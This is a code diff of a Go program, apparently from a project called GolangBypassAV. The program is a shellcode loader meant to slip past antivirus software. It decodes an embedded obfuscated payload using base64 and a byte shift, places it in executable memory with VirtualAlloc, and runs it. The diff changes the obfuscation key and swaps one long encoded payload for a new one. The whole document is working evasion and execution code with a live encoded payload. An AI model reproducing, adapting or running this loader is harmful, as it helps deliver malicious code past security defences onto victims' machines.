@@ -3,8 +3,6 @@ package main
 import (
 	"GolangBypassAV/encry"
 	"encoding/base64"
-	"fmt"
-	"os"
 	"syscall"
 	"time"
 	"unsafe"
@@ -16,26 +14,15 @@ const (
 	PAGE_EXECUTE_READWRITE = 0x40
 )
 
-var kk = []byte{0x13, 0x32}
-
-func base64Decode(data string) []byte {
-	data1, _ := base64.StdEncoding.DecodeString(data)
-	return data1
-}
-
-func base64Encode(data []byte) string {
-	bdata := base64.StdEncoding.EncodeToString(data)
-	return bdata
-}
+var kk = []byte{0x23, 0x32}
 
 func getEnCode(data []byte) string {
-	bdata := base64.StdEncoding.EncodeToString(data)
-
-	bydata := []byte(bdata)
+	bdata1 := base64.StdEncoding.EncodeToString(data)
+	bydata1 := []byte(bdata1)
 	var shellcode []byte
 
-	for i := 0; i < len(bydata); i++ {
-		shellcode = append(shellcode, bydata[i]+kk[0]-kk[1])
+	for i := 0; i < len(bydata1); i++ {
+		shellcode = append(shellcode, bydata1[i]+kk[0]-kk[1])
 	}
 	return base64.StdEncoding.EncodeToString(shellcode)
 }
@@ -63,15 +50,6 @@ func getDeCode(string2 string) []byte {
 
 }
 
-func checkError(err error) {
-	if err != nil {
-		if err.Error() != "The operation completed successfully." {
-			println(err.Error())
-			os.Exit(1)
-		}
-	}
-}
-
 func genEXE(charcode []byte) {
 
 	addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
@@ -96,16 +74,7 @@ func gd() int64 {
 
 func getFileShellCode(file string) []byte {
 	data := encry.ReadFile(file)
-	//shellCodeHex := encry.GetBase64Data(data)
-	//fmt.Print(shellCodeHex)
 	return data
-}
-
-func getFileShellCode1(file string) string {
-	data := encry.ReadFile(file)
-	shellCodeHex := base64Encode(data)
-	fmt.Print(shellCodeHex)
-	return shellCodeHex
 }
 
 func main() {
@@ -113,7 +82,7 @@ func main() {
 
 	//fmt.Print(getEnCode(getFileShellCode("C:\\Users\\Administrator\\Desktop\\payload.bin")))
 
-	bbdata := "ECZKJRYxJVBaIiIiIiYnMzI3IzQ2NzsqLkUrTTQqVTQ6JkotNklJKkoSKkg0KlVaNiZIMVURUSw1NSkrNCUpIlMlWUlHIipUKiYpI1oyEiMiRClKGDcrIzY2Si02SiQtMktZKiJFI05IOUg6JFgrEkRQViJKIiIiIiZKJ1gpM080IikyNipVKigmNC0yJCMrIkUlSzdMSxBaNigtLypJKiJFOy8uRE0qLkQkVDJEKSslNiYjWDVLSEVHJy4iEVhMJCY2FhE5OTo4JjQtMiQzKyJFI04yOlQuNCY0LTIjWSsiRSMjSlg0KjQiKTIyN0kjOCcWOzhMJzoyN00jOExKJRgkIyM2VxBIOCYnOzhMSi0mVk0xEBAQEDk4UCI0QxYUQjgWUUNONxEiJic4NDpPTjUqT1kyQ1EuRVo6KRAaNyouRE0qLkUrLy5EIy8uRE0jNiYnMjJDUBc3T05PEBo5U0QSUSpKRCcjViQiJSIiIy8uRE0jNjYnM0JILyM2NigXNxVOR1lXEDcXEk1DNCpPIzQlKTQ0Ok86NTUpKzZOSCIiTCQmNk0rI1ZWVTctS1cQEjZKK1lMSiVYEiNSJE0aKkpHJypKRVErWRklEBAQEBA1NSkrNk0rI1ZKESgoKVcQEjo5IiUVOEUiMiIiNDEQMSUVNC4iMiIiFxoxURYiJiIiMEpKEBAQEC0UTRcvWy4iTDs4N0UlRTYiQkoaUEI1KydRFiNVVhZQOiYvVjJDQxJJUC1IO1pOEElTSjYVRxdMLxlVTTlYW00XQlIoT0lYOjRYMFNTLy4WEDJWMUNINyc0T1sXGFYyFFlKNToZVFMrRiIjN0QTN1otNidPOzgWETBKIy9DFFFRQyhZSS1bNlYuJCJQOhMaVUQoJxFCOCtUOzVUSDU3LyszNCIWLUsiGCopJ0w7OS9TKiUqVi8kFVkuSzpbLUsqWC5bVEg3E01WOygaFERaIzA3JCITLUsmGConRTE3WzoRMFojNkROTUw7OBYRLVs2Vi4kTC8kSCI5OU8TVxIYQzckGC9GWi8sWy83E1kVOxpOU0tKTxhaWTQ0Tjk3E04qR0JKIltVUiM4U0UqLEQqUBoqMBoRT1g5TUtbMURLFUoaNiU6NjIjOzIaGBApOBBOKUtZVlkWOBY0FlgkNFESFCUyGDVYM05IQyZYFSMiWCkYFTNJMUhXTEITFVEMRlQwTiwnFU4aGkU3GRpVK0opSEpUJjkqKhMRFE5WW1YuM1gmOE1USygtMTBKLxURTjArRylLE0w0VyoXKhEaOFAXMjZHFCVGRBY3KDFZSykYThNXQyZENxdDEUdQU1AZJCxaRTRZKhg4QlUYKk01KDdZUUpGURZTK043LylTFUUVWyoiMkMYWFVCKzgQGjcqLkROFyIiIyIiJigVIiMiIiImKBYyIiIiIiYoFzgsMzUWRxA3NCsvNTYRSisWEUorGTZKKxNMKBUiJCIiIiZOKww2KBcmUUIrFVcQNzQqMSYqKjkiRS07TkpYRSoiRDAnWCk5OTgnSTo0IjYiIiIiIjYuMVBPEBQQEFsmWi5KFRYtSyYSL1oVWS5LKiImSzM4RiIeHg=="
+	bbdata := "IDZaNSZBNWBqMjIyMjY3Q0JHM0RGR0s6PlU7XUQ6ZURKNlo9RllZOloiOlhEOmVqRjZYQWUhYTxFRTk7RDU5MmM1aVlXMjpkOjY5M2pCIjMyVDlaKEc7M0ZGWj1GWjQ9QltpOjJVM15YSVhKNGg7IlRgZjJaMjIyMjZaN2g5Q19EMjlCRjplOjg2RD1CNDM7MlU1W0dcWyBqRjg9PzpZOjJVSz8+VF06PlQ0ZEJUOTs1RjYzaEVbWFVXNz4yIWhcNDZGJiFJSUpINkQ9QjRDOzJVM15CSmQ+RDZEPUIzaTsyVTMzWmhEOkQyOUJCR1kzSDcmS0hcN0pCR10zSFxaNSg0MzNGZyBYSDY3S0hcWj02Zl1BICAgIElIYDJEUyYkUkgmYVNeRyEyNjdIREpfXkU6X2lCU2E+VWpKOSAqRzo+VF06PlU7Pz5UMz8+VF0zRjY3QkJTYCdHX15fICpJY1QiYTpaVDczZjtCRTIyMz8+VF0zRkY3Q1JYPzNGRjgnRyVeV2lnIEcnIl1TRDpfM0Q1OURESl9KRUU5O0ZeWDIyXDQ2Rl07M2ZmZUc9W2cgIkZaO2lcWjVoIjNiNF0qOlpXNzpaVWE7aSk1ICAgICBFRTk7Rl07M2ZaITg4OWcgIkpJMjUlSFUyQjIyREEgQTUlRD4yQjIyJypBYSYyNjIyQFpaICAgID0hXUtVRkoyMyMjYzpCSTZAYjQ8PFJKIzNhV1UcYCJTQFRqJSEgVSQ/RltTPyY1JkFZRSM3YGFcVlIgVSEqKFhkZUQqQz4zIDlmVlM3KCpiR0FAREMoaEdFWVpAJks6IiQ9KjY0WVlJYlgzR1QjR2o9RjdfS0gmIUBaMz9TJGFhUzhpWT1rRmY+NDJgSiMqZVQ4NyFSSDtkS0VkWEVHPztDRDImPVsyKDo3VWFTXkNnVSQ+WEVdQlg/WiVpQGozSUUiVCM/NWRYRzk7YUs4R2ZVNCkiPVsyKDo2O0FERkYmQCFHQEdHP0VDRiFhNUJgMipIYkg1WTxiP1hEJWFjKkVeOWRLIGdZZDVSNzsoY0ZpKVUjNCVTSmVkRmZSYjgnQiRmPSFiNSBGKDhUaWM8SUtaXVZlKlYpWlooJ1RAOEZaKiY/XGhgM1ghY1lbM2pZYSkgXGFeMkgga0tGWD8hZDtSZEAmIEtpRFlrO1tKI1MjPDw7Q1UyP1Y5OkY8I2IzNmBaWyQlZD5eMxxJNig+RVRkNWYcWyNoVjlJOFgiP1U8QCU+WEZTOypUZCFWPSQkNCg6YVZLNkdqS0tqVik2NmVWaVhGY1hES2ldXFNbZCMoWzc1XTNYaUocMl02X1chJl4qKWRDaltKOGY1IklTUyQ0KRxAIUZKaF9BI2hrazIyQlMoaGVSO0ggKkc6PlReJzIyMzIyNjglMjMyMjI2OCZCMjIyMjY4J0g8Q0UmVyBHRDs/RUYhWjsmIVo7KUZaOyNcOCUyNDIyMjZeOxxGOCc2YVI7JWcgR0Q6QTY6OkkyVT1LXlpoVToyVEA3aDlJSUg3WUpEMkYyMjIyMkY+QWBfICQgIGtGIT1bNiNARCVpP2tYZj9bNjI2W0NIVjIuLg=="
 	shellCodeHex := getDeCode(bbdata)
 	gd()
 	genEXE(shellCodeHex)
